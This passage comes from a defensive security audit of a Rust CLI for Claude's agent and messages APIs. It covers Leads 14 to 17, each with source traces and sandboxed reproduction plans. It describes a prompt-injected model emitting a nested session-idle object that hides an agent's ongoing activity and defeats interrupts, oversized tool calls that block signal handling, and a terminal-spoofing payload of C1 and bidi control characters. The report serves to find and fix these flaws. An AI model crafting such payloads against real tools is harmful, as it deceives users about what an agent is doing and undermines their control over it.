In an offline sandbox with an empty allowlisted environment, a read-only target and scratch-only writes, build rust/. Write <scratch>/s.sse containing exactly two lines: `: connected` and `data: {"type":"agent.message","id":"e1","content":[{"type":"text","text":"partial"}]}`, each newline-terminated, with no idle line. Then run `env -i ASK_CLAUDE_REPLAY=<scratch>/s.sse ASK_CLAUDE_AGENT=agent_x ASK_CLAUDE_ENVIRONMENT=env_x ANTHROPIC_API_KEY=dummy XDG_STATE_HOME=<scratch>/state ASK_CLAUDE_REQUEST_LOG=<scratch>/req.log ask-claude agent hi`. Expect exit status 0, `partial` on stdout, a sessions/ stub for sesn_FIXTURE01 under <scratch>/state/ask-claude, an events.jsonl line with an empty error, and no `user.interrupt` body in req.log. As a unit-level equivalent, drive Agent::turn over a Replay directory whose 1.sse lacks the idle line, and assert rc != 0, that a user.interrupt POST was sent, and that no stub was written. A fixed build should pass that assertion and fail the current one.

### Owner-observed check

The API owner checks, on a dummy session with a small budget, whether a Managed Agents session keeps running (status running, list_cost rising) after its /events/stream connection is closed mid-turn without user.interrupt. The owner also checks whether the stream endpoint has a server-side lifetime that can close it before session.status_idle.

---

<a id="lead-14"></a>
## Lead 14: Raw-substring turn-end framing can be triggered by a nested object in model-controlled tool input, so the turn is reported as a clean exit 0 while the session is still running

- **Fingerprint:** `rust/src/agent.rs:ends_turn:raw-substring-turn-end-matches-nested-input`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** corrected: non-material correction applied (v5-05)
- **Affected boundary:** Integrity of the reported turn outcome. Raw-substring framing and the decoded fold disagree, and the turn ends with exit 0 while the session keeps running.

### Description (verified record text)

Two consumers read the same session stream line differently. ToTurnEnd::read (agent.rs 1113-1116) and Streamed::take (agent.rs 1039) stop at the first raw line containing the substring "type":"session, then any one character, then status_idle" or status_terminated". The match can be anywhere in the line (ends_turn, agent.rs 1129-1137). session::fold, by contrast, picks the idle or terminated event only by the top-level type (session.rs 51). sse::decode returns valid UTF-8 unchanged (sse.rs 46). Inside a JSON string a quote is escaped as \", so text content cannot match. A nested JSON object can match, for example in the model-chosen input object of an agent.custom_tool_use event ("input":{"f":{"type":"session.status_idle"}}), or of any tool-use event whose input schema allows a free-form object. On such a line the CLI drops the connection. That event is still folded, but no top-level idle exists, so stop_reason is null. turn() then skips the requires_action branch, logs the turn with an empty error kind (agent.rs 826), maps "" to exit 0 (agent.rs 829) and posts no user.interrupt. one_shot remembers the session as successful (agent.rs 674-677), and chat mode does the same for a new session. The session keeps running on the server. Its remaining output and tool markers are never shown, and the CLI's signal-to-interrupt path for that turn is gone. In chat mode the next user.message goes to a session that has not finished its turn. Impact is limited. The cut gives no new authority: tools under always_allow run server-side whether or not the CLI is watching. Calls the CLI itself gates (always_ask confirmations, custom and local-MCP tools) go unanswered afterwards, which fails safe. What is lost is result integrity (a truncated turn reported as success to the user and to scripts) and the ability to see or interrupt later server-side activity from this CLI. The trigger also depends on attacker-steered model output (prompt injection) plus a provider serialization fact. The bash oracle has the same pattern (lib/agent-turn.bash line 58, sed '/"type":"session.status_idle"/q'). That shared pattern is calibration only and does not excuse the Rust code.

### Claimed root cause

ends_turn (agent.rs 1129-1137) frames the turn with a raw substring search over the whole SSE line instead of the decoded top-level event type that session::fold uses (session.rs 51). When the two disagree, turn() fails open: a fold with no idle or terminated event gives a null stop_reason, which agent.rs 829 maps to success ("end_turn" | "" => 0) with no interrupt.

### Source trace

1. **entrypoint**: `rust/src/agent.rs:1113` (`ToTurnEnd::read`). Each raw line of the session event stream, which carries untrusted model-produced event content, is read with read_until. ends_turn is applied to the whole decoded line (line 1114).
2. **propagation**: `rust/src/agent.rs:1129` (`ends_turn`). Uses match_indices on "type":"session anywhere in the line, skips any one character, then checks for status_idle" or status_terminated". Neither nesting depth nor key position is checked, so a nested {"type":"session.status_idle"} inside a tool input object matches.
3. **propagation**: `rust/src/agent.rs:1039` (`Streamed::take`). done = ends_turn(text) on the tool-use line. The event itself is still parsed and pushed, but reading stops, and ToTurnEnd sets reply = None (line 1116), which closes the connection.
4. **propagation**: `rust/src/session.rs:51` (`session::fold`). idle is the last event whose top-level type is session.status_idle or session.status_terminated. None was read, so idle is null and stop_reason (lines 61-65) is null.
5. **sink**: `rust/src/agent.rs:829` (`Agent::turn`). stop_reason null becomes "", which maps to exit 0. No user.interrupt is posted, the event log records an empty error kind (line 826), and one_shot remembers the session as successful (lines 674-677).

### Verified evidence

- `rust/src/agent.rs:1130`: const AT = "\"type\":\"session"; the search covers the full raw line, not the top-level type field.
- `rust/src/agent.rs:1116`: self.reply = None drops the connection right after the matched line is handed over.
- `rust/src/sse.rs:46`: decode returns valid UTF-8 unchanged, so the substring test sees the raw JSON text, where nested object keys are unescaped.
- `rust/src/session.rs:58`: fold copies the input object verbatim, but only for tool-use events whose id the idle's stop_reason.event_ids names. The point here is upstream of fold: the model-chosen input object is serialized inside the same raw event line that ends_turn scans, so a nested {"type":"session.status_idle"} in it is seen by the substring test while fold, keyed on the top-level type, never treats that event as an idle.
- `rust/src/agent.rs:829`: "end_turn" | "" => 0: a missing stop reason is treated as success instead of failing closed with an interrupt.
- `rust/src/agent.rs:1275`: The unit test a_turn_ends_at_the_session_idle_not_the_thread_idle covers only top-level type values. No nested-object case is tested.
- `tests/fixtures/sessions/custom-tool/1.sse:13`: The recorded (sanitized) agent.custom_tool_use line has compact JSON with the input object inline ("input":{"city":"Paris"}). This supports, but does not prove, that a nested input object would reach the line in the compact form ends_turn matches.
- `lib/agent-turn.bash:58`: The bash oracle (out of scope) uses the same raw sed match, '/"type":"session.status_idle"/q'. This is a shared pattern, used as calibration only.

### Exact blockers

- No OS-enforced sandbox and no built binary are available in this run, so the replay reproduction (exit 0, no user.interrupt request, session remembered) could not be run and observed. The source trace is complete, but the runtime result is unobserved.
- Provider fact not visible in source: whether the Managed Agents API emits a model-supplied tool input containing a nested {"type":"session.status_idle"} (or ...status_terminated) verbatim and compactly in the agent.custom_tool_use, agent.tool_use or agent.mcp_tool_use event line, with no whitespace after the colon and no rejection or rewriting by input-schema validation. The fixture at tests/fixtures/sessions/custom-tool/1.sse line 13 shows compact serialization, but it is sanitized and may have been re-serialized.

### Bounded local resolution plan

Build rust/ and run the binary only inside a network-less sandbox with umask 077 and an empty environment apart from these variables: ANTHROPIC_API_KEY=sk-ant-test-not-a-key (Agent::new, agent.rs 525, refuses with exit 2 without a key even under replay; replay never sends it), ASK_CLAUDE_AGENT=agent_FIXTURE, ASK_CLAUDE_ENVIRONMENT=env_FIXTURE, ASK_CLAUDE_REPLAY=<scratch>/nested.sse (a file, so every stream of the run replays it and the create gets the default sesn_FIXTURE01), ASK_CLAUDE_REQUEST_LOG=<scratch>/requests.jsonl (one line per request body), XDG_STATE_HOME=<scratch>/state, HOME=<scratch>. Run `<bin> agent ping </dev/null`. nested.sse should contain these lines, each followed by a blank line: ': connected'; data: {"id":"sevt_X","input":{"f":{"type":"session.status_idle"}},"name":"t","type":"agent.custom_tool_use"}; data: {"content":[{"text":"AFTER","type":"text"}],"id":"sevt_Y","type":"agent.message"}; data: {"id":"sevt_Z","stop_reason":{"event_ids":["sevt_X"],"type":"requires_action"},"type":"session.status_idle"}. Expected if vulnerable: exit status 0; '(t)' printed but 'AFTER' never printed; requests.jsonl has exactly one line (the create body) and no line containing user.interrupt or user.custom_tool_result; a session stub appears at <scratch>/state/ask-claude/sessions/sesn_FIXTURE01. Control: replace the nested value with a string ("f":"type:session.status_idle"). Each stream then reaches the real idle with requires_action and one custom call. Without --local-mcp, session::answer replies to it with a user.custom_tool_result error ('Tool unavailable ...'), and the next stream replays the same file. After ROUNDS (8) answered rounds the cap is exceeded, turn() prints '[stopped: requires_action after 9 custom tool rounds; interrupting]', posts user.interrupt and exits 1. 'AFTER' is printed on each round, requests.jsonl holds the create, 8 user.custom_tool_result bodies and 1 user.interrupt body, and no session stub is written. Regression test: ends_turn must match only the decoded top-level type, or turn() must exit 1 and post user.interrupt when the fold has no idle or terminated event.

### Owner-observed check

Owner check on a disposable test agent and environment, with no repo, vault or memory attached. Define a custom tool whose input_schema allows a free-form object property and send a prompt that asks the model to call it with {"f":{"type":"session.status_idle"}}. Capture the raw SSE line of the resulting agent.custom_tool_use event with curl against the session stream, without ask-claude. Record whether it contains the compact substring "type":"session.status_idle" in the input object. Then archive the session.

---

<a id="lead-15"></a>
## Lead 15: A Messages reply cut off mid-stream (failed read, timeout or early EOF) is saved to the chat and logged as a successful turn, and the process exits 0

- **Fingerprint:** `rust/src/lib.rs:exchange:truncated-stream-committed-as-complete-reply`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-10)
- **Affected boundary:** Integrity of the Messages reply and of its success signal (saved chat, event log, exit status) against suffix truncation.

### Description (verified record text)

On the Messages path (one shot, chat and resume; -p anthropic and -p openai), exchange() handles a failed body read (Next::Failed, including expiry of the 1800 s timeout_global) the same way as a clean end of stream. It prints the error to stderr, breaks, and returns Ok with every line that arrived. reply() and reassemble::message do not require message_stop or a message_delta stop_reason. With -p openai, Translated/Chunks do not require finish_reason or data: [DONE] either. So any stream that ends after at least one well-formed, newline-terminated data: line folds to Ok(msg) with stop_reason null. call() then appends the partial assistant content to the chat file, writes an event-log line with an empty error, prints '[stopped: null]' and returns 0. one_shot passes that 0 to the process exit status, and chat/resume continue over the truncated turn, which is resent as context. A peer on the network path, or an environment-selected *_PROXY that relays the CONNECT tunnel, cannot read or change the TLS content. It can still end the TCP connection at a TLS record boundary of its choice. In ureq 3.5.2 that closure surfaces as io::ErrorKind::UnexpectedEof for a chunked or Content-Length body, and as a plain EOF for a close-delimited body. The application accepts both. The shell sees success, scripted consumers take the suffix-truncated answer as complete, and the truncated turn becomes stored context. The impact is limited to the integrity of the reply's completeness and of the success signal. The attacker can only remove a suffix: it cannot insert content or forge a role, and the Messages path runs no client-side tools. A truncated round has stop_reason null, so the pause_turn loop does not continue it. The bash oracle (lib/messages.bash) shares the pattern, which strengthens rather than excuses the Rust finding.

### Claimed root cause

lib.rs exchange() keeps no record of Next::Failed: it calls failed() and breaks, exactly as for Next::End, then returns Ok(got). Neither reply() nor reassemble::message checks that the stream completed (message_stop, or a message_delta carrying a stop_reason), and openai::Translated returns Ok(0) at EOF without finish_reason/[DONE]. call() therefore cannot tell a truncated round from a complete one and commits it like any reply: history push, save, an event log entry with error "", and return 0.

### Source trace

1. **entrypoint**: `rust/src/transport.rs:329` (`lines (worker thread)`). The worker's read_until over the ureq response body turns an io error (connection reset, the peer disconnecting mid chunked/Content-Length body, which ureq 3.5.2 reports as UnexpectedEof, or timeout_global expiry) into an Err item. Ok(0) at line 327 breaks the loop and disconnects the channel.
2. **propagation**: `rust/src/transport.rs:368` (`Lines::tick`). The Err item becomes Next::Failed. A disconnected channel becomes Next::End (line 370).
3. **propagation**: `rust/src/lib.rs:328` (`exchange`). Next::Failed calls failed() (stderr only) and breaks, just as Next::End does at line 332. Received keeps no record of the failure.
4. **propagation**: `rust/src/lib.rs:345` (`exchange`). Returns Ok(got) with the lines received so far. Only a pending signal turns the result into Err(Interrupted).
5. **propagation**: `rust/src/lib.rs:592` (`reply`). With sse true and every data: line parsable, the round folds through reassemble::message. reply() rejects only zero bytes, a non-SSE body, an unparsable line, a fold error or a non-empty error.message. Nothing checks for stream completion.
6. **propagation**: `rust/src/reassemble.rs:93` (`message`). Only message_delta sets stop_reason. message_stop falls into the ignored '_' arm (line 111), so a fold that has neither returns Ok with stop_reason null and the partial content blocks.
7. **propagation**: `rust/src/lib.rs:500` (`call`). Pushes {role: assistant, content: msg.content}, the partial content, onto the history and saves the chat through keep() at line 502.
8. **propagation**: `rust/src/lib.rs:518` (`call`). Records the round in the event log with error "", the same record a successful round gets. stop_reason null does not equal pause_turn (line 519), so the loop breaks with the truncated message.
9. **sink**: `rust/src/lib.rs:540` (`call`). After printing '[stopped: null]' through the catch-all arm (line 534), call returns 0. one_shot (lib.rs:406-410) returns that 0 as the process exit status, and run_loop (chat.rs:231) continues the chat over the truncated turn.

### Verified evidence

- `rust/src/lib.rs:332`: Next::End => break. The Next::Failed arm above it (lines 328-331) also only prints through failed() and breaks.
- `rust/src/lib.rs:565`: Start of reply()'s checks: zero bytes, a non-SSE body, events None (an unparsable line), a fold error, or a non-empty error.message. None of them requires message_stop or a stop_reason.
- `rust/src/transport.rs:50`: timeout_global(1800 s) on the ureq agent. Expiry mid-body arrives as a read error, which becomes Next::Failed and takes the same accept path.
- `rust/src/openai.rs:106`: Translated::read returns Ok(0) at inner EOF whether or not finish_reason/[DONE] arrived, and propagates a read error with ?. Without them Chunks never emits message_delta/message_stop, so an open text block with stop_reason null folds successfully.
- `rust/tests/goldens.rs:180`: r2_a_tool_use_cut_off_before_its_stop_keeps_its_partial pins that a tool_use block cut before its content_block_stop folds successfully and keeps its 'partial' accumulator, so the fold accepts truncation by design.
- `rust/Cargo.lock:1256`: ureq is pinned at 3.5.2 (with rustls 0.23.46 at line 957). The registry source of that version (run.rs:686-697 and 737-744) maps a peer disconnect before a chunked or Content-Length body completes to io::ErrorKind::UnexpectedEof ('Peer disconnected'), which is the Next::Failed variant here. A close-delimited body ends in Ok(0), which is Next::End.
- `lib/messages.bash:90`: The oracle ignores the transport pipeline's exit status and checks only [ -s "$log" ] (line 94). A mid-stream curl failure with a non-empty log reaches the success branch too, so the defect pattern is shared.

### Exact blockers

- No OS-enforced sandbox is available in this run, so neither the ask-claude binary nor the rust/tests harness could be built or run. The exit status, the saved chat file and the event-log line for a truncated stream remain unobserved. Source shows the path end to end, but the skill requires a bounded local reproduction before confirming.
- The transport variant (an on-path peer or a *_PROXY tunnel closing TCP mid-body without close_notify) was established only by reading the pinned ureq 3.5.2 / rustls 0.23.46 registry source: chunked or Content-Length leads to UnexpectedEof, which is Next::Failed, and close-delimited leads to Ok(0), which is Next::End. It was not observed at runtime. Both outcomes reach the same accept path, so this affects only which branch fires, not reachability.

### Bounded local resolution plan

In a sandbox with networking disabled, an empty allowlisted environment, a read-only target and scratch-only writes: (1) Write a replay file that holds only the message_start, content_block_start and the first text_delta data: lines of the tests/fixtures text.sse fixture, each newline-terminated, with no message_delta and no message_stop. Run `ask-claude ping` with only ASK_CLAUDE_REPLAY=<file>, XDG_STATE_HOME=<scratch>/state, HOME=<scratch> and the dummy ANTHROPIC_API_KEY=sk-ant-test-not-a-key set. Expect exit 0, stderr ending '[stopped: null]', a chat file under <scratch>/state whose last element is an assistant turn holding the partial text, and an events.jsonl line with an empty error. (2) For the Failed variant, use the rust/tests/http.rs Mock with Reply::held("text.sse", after("text.sse", "\"pong\"")) and close the server socket instead of releasing it, using a chunked or Content-Length reply. Expect 'ask-claude: Peer disconnected' (or another io error) on stderr and still exit 0, with the same chat and event-log result. (3) Repeat (1) with -p openai and OPENAI_API_KEY=sk-test-not-a-key, using a chat-completions chunk stream that has delta.content but no finish_reason and no data: [DONE]. Expect exit 0 and a saved assistant text turn. Any exit 1, or a rolled-back chat, in these runs refutes the candidate.

### Owner-observed check

None. The record has no deployment plan, and the local plan above can answer all of its blockers.

---

<a id="lead-16"></a>
## Lead 16: Model-sized tools/call write to a stalled --local-mcp server blocks the main thread with no deadline, and Ctrl-C/SIGTERM/SIGHUP cannot interrupt it

- **Fingerprint:** `rust/src/local_mcp.rs:LocalMcp::send:uninterruptible-blocking-stdin-write`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-13)
- **Affected boundary:** The user's graceful stop control (Ctrl-C, SIGTERM, SIGHUP) during a write to a stalled --local-mcp server. From source the impact is confined to the user's own process; any shared or operator-owned effect depends on provider facts.

### Description (verified record text)

LocalMcp::send writes each JSON-RPC line to the --local-mcp server's stdin with a blocking ChildStdin::write_all and flush on the main thread. The only deadline (ASK_CLAUDE_LOCAL_MCP_TIMEOUT, default 120 s) and the only interrupt checks cover the read side and the moment before a send. When a tools/call times out (Unanswered::Late), the server may still be busy and not reading stdin. The untrusted model can then issue another custom tool call that the gate allows, in the same round or a later one (at most ROUNDS=8 custom rounds per turn). If the tools/call line, alone or added to earlier unread lines, exceeds the free pipe capacity (64 KiB by default on Linux, less under pipe-user-pages limits), write(2) blocks until the server reads again. The SIGINT/SIGTERM/SIGHUP handlers only set INTERRUPTED and use SA_RESTART. Even without SA_RESTART, Rust's write_all retries on EINTR. So the write never returns to a point where interrupted() is checked, and the KTD11 path (exit 130, user.interrupt POST, server stop) waits until the write completes. The server runs in its own process group, so terminal Ctrl-C does not reach it. The CLI recovers on its own if the server finishes its busy call and drains stdin. It also recovers if the user kills the server's process group: the write then fails with EPIPE (SIGPIPE is ignored for the write), send returns false, the remaining calls see the flag, and the interrupt path runs. If the server never drains, the user's remaining exits are SIGQUIT or SIGKILL of ask-claude, which skip Drop/stop, leave the server group running and post no user.interrupt. The bash oracle writes through a `cat >&7` child in the foreground process group, so terminal Ctrl-C kills that child and the INT path continues. A SIGTERM aimed only at the bash script's pid would also wait for the foreground child, so the contrast holds for terminal-delivered signals only. Shown from source, the impact is limited to the user's own CLI: loss of the graceful stop control and an orphaned server group on a hard kill. Any shared or operator-owned effect depends on unverified provider behavior.

### Claimed root cause

LocalMcp::send (rust/src/local_mcp.rs:169-188) does a blocking ChildStdin::write_all/flush on the main thread, with no deadline, writer thread, non-blocking mode or interrupt check during the write. LocalTools::call checks interrupted() only once, before the send (local_mcp.rs:304). catch_signals (rust/src/transport.rs:272-284) installs SA_RESTART handlers that only store INTERRUPTED. A pipe write(2) blocked with nothing written is restarted, and std's write_all retries any EINTR in any case, so the flag is not read until the server drains the pipe or closes it. Removing SA_RESTART alone would not fix this. The send needs its own deadline or interruptible wait.

### Source trace

1. **entrypoint**: `rust/src/agent.rs:810` (`Agent::turn`). A requires_action fold carrying custom tool uses from the untrusted model is answered on the main thread through self.answer, for up to ROUNDS=8 custom rounds per turn (agent.rs:25, 806-809).
2. **propagation**: `rust/src/session.rs:497` (`session::answer`). Each custom tool use that the server lists (has) and the gate allows (ASK_CLAUDE_CONFIRM=allow, a tty yes, or an in-memory 'always' for the shown name) goes to LocalTools::call, one after another. The gate does not cap the input size.
3. **propagation**: `rust/src/local_mcp.rs:318` (`LocalMcp::call`). An earlier call whose read passes the timeout returns an error result (Late), while the server may still be busy and not reading stdin.
4. **propagation**: `rust/src/local_mcp.rs:307` (`LocalMcp::call`). The next call copies the model-controlled input verbatim into params.arguments with no size cap and sends it (308). The only interrupted() check is at 304, before the send.
5. **sink**: `rust/src/local_mcp.rs:181` (`LocalMcp::send`). A blocking write_all/flush to the server's stdin pipe with no deadline. It blocks once the unread bytes exceed the free pipe capacity, and signals do not break it out.

### Verified evidence

- `rust/src/local_mcp.rs:181`: `let sent = stdin.write_all(&line).and_then(|()| stdin.flush());` is a blocking write on an unbuffered ChildStdin with no timeout or interrupt check. send() returns false only on an error such as EPIPE.
- `rust/src/local_mcp.rs:205`: Only read() has a deadline: recv_timeout bounded by the timeout and TICK, with interrupted() checked at 199. Nothing equivalent guards send().
- `rust/src/local_mcp.rs:304`: call() checks interrupted() once, before the send. A signal that arrives during a blocked write is first seen in read() (199) after the write completes.
- `rust/src/transport.rs:278`: `action.sa_flags = libc::SA_RESTART;` applies to SIGINT, SIGTERM and SIGHUP (280-281). on_signal only stores INTERRUPTED (265), so a pipe write blocked with nothing written is restarted. std's write_all also retries ErrorKind::Interrupted.
- `rust/src/local_mcp.rs:81`: process_group(0) puts the server in its own process group, so a terminal SIGINT/SIGHUP does not reach the peer that must drain the pipe.
- `rust/src/local_mcp.rs:284`: stop() runs only from Drop. It is unreachable while the main thread is blocked in send(), and it is skipped after SIGKILL/SIGQUIT, which leaves the server group running.
- `lib/local-mcp.bash:28`: Oracle contrast: the bash twin writes through a `cat >&7` subshell child in the foreground process group, which a terminal Ctrl-C kills, so the send fails and INT handling continues.

### Exact blockers

- No OS-enforced sandbox is available in this run (no network isolation, no empty allowlisted environment, no read-only target with scratch-only writes, no resource or time limits), so no fixture or built binary may be executed. That a full pipe blocks the restarted write and that SIGINT does not end it has not been observed locally. It follows from source, from Linux pipe semantics and from std write_all's EINTR retry.
- Whether real stdio MCP servers stop draining stdin while a tools/call runs, and long enough to pass the timeout (default 120 s), is outside the repository. Servers built on async SDKs usually keep reading, while sequential read-process-write servers do not. The hang lasts forever only if the busy call never finishes. The trigger also needs a model-sized argument, or unread lines from earlier timed-out calls, larger than the free pipe capacity (64 KiB by default on Linux).
- Whether a Managed Agents session left in requires_action with an unanswered custom tool use and no user.interrupt keeps charging operator-owned spend or holds a container is a provider fact outside the repository. Without it, the source-visible impact is confined to the user's own process: the graceful Ctrl-C/SIGTERM/SIGHUP stop is lost, and a hard kill orphans the server group. Under the resource-exhaustion rules that is hardening rather than a shared-impact vulnerability.

### Bounded local resolution plan

Inside an OS-enforced sandbox (no network, empty allowlisted environment, target read-only, scratch-only writes, CPU/memory/process/wall-clock limits), reuse the rust/tests/agent.rs harness (spawn plus interrupt_within) with an ASK_CLAUDE_REPLAY session fixture. Use a --local-mcp fixture shell server that answers initialize and tools/list for one tool named `slow`. On the first tools/call it stops reading stdin and sleeps longer than the test limit, without exiting. Set ASK_CLAUDE_LOCAL_MCP_TIMEOUT=1 and ASK_CLAUDE_CONFIRM=allow. The replayed stream requests two `slow` custom tool uses in one requires_action round, the second with an `input` string of about 128 KiB. Send SIGINT to ask-claude about 3 s in, and assert exit 130 within 5 s. Expected failing result: no exit, with the main thread in pipe_write per /proc/<pid>/task/*/wchan or stack. Then, from the harness, kill the fixture's process group and assert that ask-claude exits 130 promptly (the recovery path). Regression check for a fix (a writer thread or a poll(2)-based write with the timeout and interrupted() checks): the first assertion passes, user.interrupt is posted to the replay or mock endpoint, and the server group is gone. Tear down every fixture process when the sandbox ends.

### Owner-observed check

The owner should check, in Managed Agents documentation or billing records for a dummy session, whether a session left idle in requires_action with an unanswered custom tool use (no user.interrupt sent) keeps accruing runtime cost or holding a container, and for how long before the provider times it out. The owner should also confirm whether the stdio MCP servers users run with --local-mcp read stdin concurrently with tools/call execution.

---

<a id="lead-17"></a>
## Lead 17: `agent tools` prints local MCP tool metadata to the terminal with C1 controls and bidi overrides left raw

- **Fingerprint:** `rust/src/agent.rs:tools:local-mcp-definitions-printed-without-safe`
- **Verdict:** `needs_validation` (no severity)
- **Phase 5:** verified unchanged (v5-06)
- **Affected boundary:** API/third-party text to terminal. Tool metadata relayed by a local MCP command is printed by `agent tools` with C1 controls and bidi overrides left raw.

### Description (verified record text)

`ask-claude agent tools --local-mcp <cmd>` prints the server's `tools/list` entries as pretty JSON on stdout. The output holds `name`, `description` (falling back to `title`, then `name`) and `inputSchema` without `$schema`. None of this text goes through `stream::safe`. serde_json 1.0.154, pinned in rust/Cargo.toml with only `preserve_order`, escapes only U+0000-U+001F, `"` and `\`. The code then rewrites DEL. Every other code point is written as raw UTF-8. That includes the C1 controls U+0080-U+009F (bytes C2 80 to C2 9F, among them CSI U+009B, OSC U+009D and ST U+009C) and the nine bidi embedding, override and isolate controls U+202A-U+202E and U+2066-U+2069. The other stdout printers of data from outside the process filter exactly these sets: `agent list` rows, `budget`, `files` cells, and the stream through `safe`. The approval prompt escapes them through `for_approval`. The local child already has the terminal through its inherited stderr (local_mcp.rs:79; README: 'The server's stderr is yours'), so the child itself gains nothing. The case that remains is metadata the local command relays from a third party that cannot reach that stderr, for example a stdio proxy to a remote MCP server. The bash oracle's comment names hosted servers (Supabase's, Cloudflare's) as expected sources. When `agent tools` runs with stdout on a terminal, such a third party could put C1 control sequences or bidi reordering into the user's terminal. The README shows the output redirected to tools.json, which is the documented use. In that case the raw code points land in the file and reach the terminal later only if the file is displayed. The oracle (`jq` at ask-claude:150-151) behaves the same way, which makes this a shared defect, not a reason to dismiss it.

### Claimed root cause

`tools()` in rust/src/agent.rs:139-140 builds its output with `serde_json::to_string_pretty(&server.definitions())` and a DEL-only replacement. It does not apply the `safe` filter of rust/src/stream.rs to the strings the server supplied. It also does not apply an escaping equivalent that keeps the JSON valid, such as the `\uXXXX` rewrite in `for_approval` (rust/src/lib.rs:752).

### Source trace

1. **entrypoint**: `rust/src/local_mcp.rs:155` (`LocalMcp::handshake`). Each `tools/list` page's `result.tools` array, read from the server's stdout, is appended to `self.tools` unchanged. A relaying server passes its upstream server's names, descriptions and schemas through.
2. **propagation**: `rust/src/local_mcp.rs:238` (`LocalMcp::definitions`). description = .description // .title // .name, and input_schema = .inputSchema (or an empty object schema) minus the top-level `$schema`. All strings are copied unchanged into the custom tool definitions.
3. **propagation**: `rust/src/agent.rs:139` (`tools`). `serde_json::to_string_pretty` (serde_json =1.0.154) escapes only U+0000-U+001F, quote and backslash. C1 and bidi code points are emitted as raw UTF-8.
4. **sink**: `rust/src/agent.rs:140` (`tools`). Only DEL is rewritten (`replace('\u{7f}', "\\u007f")`). Then `crate::chat::out` (rust/src/chat.rs:252-256) writes the bytes to stdout, which is the terminal unless the user redirects it.

### Verified evidence

- `rust/src/stream.rs:54`: `safe`, documented as 'The `safe` of every printer', keeps tab and LF and drops other C0, DEL, C1 (128..=159) and U+202A-202E and U+2066-2069. The other stdout printers of external data in agent.rs (lines 121, 207 and the `files` cells at 390) call it. `agent tools` does not.
- `rust/src/lib.rs:752`: `for_approval` escapes C1, bidi and invisible code points as lowercase `\uXXXX` inside valid JSON. Applying it to the `agent tools` output would keep the output pasteable as tools.json and neutralise the terminal controls.
- `rust/src/local_mcp.rs:79`: The child's stderr is inherited (`Stdio::inherit()`). A malicious local command can therefore already write to the terminal, which limits the affected case to metadata the child relays from a third party.
- `rust/src/agent.rs:130`: `agent tools` needs no API key and only asks the local server. README.md:236 shows it redirected (`> tools.json`), but nothing stops it printing to a terminal.
- `rust/Cargo.toml:28`: serde_json is pinned to =1.0.154 with only `preserve_order`, which does not change string escaping. The default formatter escapes only control bytes below 0x20, quote and backslash.

### Exact blockers

- No OS-enforced sandbox is available in this run. Neither the binary nor a function harness may be built or run, so the exact bytes `agent tools` writes for a tools/list entry containing U+009B or U+202E cannot be captured. The raw passthrough is source-certain, but it has not been observed.
- Whether a terminal acts on UTF-8-encoded C1 code points (U+009B as CSI, or U+009D...U+009C as OSC) or applies bidi reordering depends on the terminal and its settings. xterm-family terminals, VTE, Konsole and mlterm differ, and no terminal renderer can be observed from source. The security effect beyond invisible or confusing characters depends on this.
- Whether users run `--local-mcp` commands that relay third-party `tools/list` metadata, such as stdio proxies to remote or hosted MCP servers, is a deployment fact. Only in that case does the author of the metadata lack the child's direct stderr access to the terminal.

### Bounded local resolution plan

In an approved sandbox (no network, empty allowlisted environment, read-only target, scratch-only writes, low CPU, memory and wall-clock limits), build the crate with `cargo build --offline`. Run `ask-claude agent tools --local-mcp '<fixture>'`. The fixture is a scratch stdio script that answers `initialize`, then answers `tools/list` with {"name":"t","description":"a\u009b31mRED\u202egnp.exe\u0007\u007f","inputSchema":{"type":"object"}}. Pipe stdout through `od -An -tx1`. Expect the bytes c2 9b and e2 80 ae unescaped, while BEL appears as `\u0007` and DEL as `\u007f`. As a control, run a unit test calling `stream::safe` on the same string and confirm both code points are dropped. Calling `for_approval` on the definitions should show them escaped as `\u009b` and `\u202e`.

### Owner-observed check

Owner-observed and non-destructive. On the terminals the user actually uses, run the same fixture with stdout on the terminal. Record whether U+009B starts a CSI sequence (the text turns red, or the terminal shows a replacement glyph) and whether U+202E visibly reverses the description. Separately, list the `--local-mcp` commands in use (ASK_CLAUDE_LOCAL_MCP and scripts). Record whether any of them relays tool metadata from a remote or third-party MCP server (for example an mcp-remote-style proxy) instead of authoring it locally.
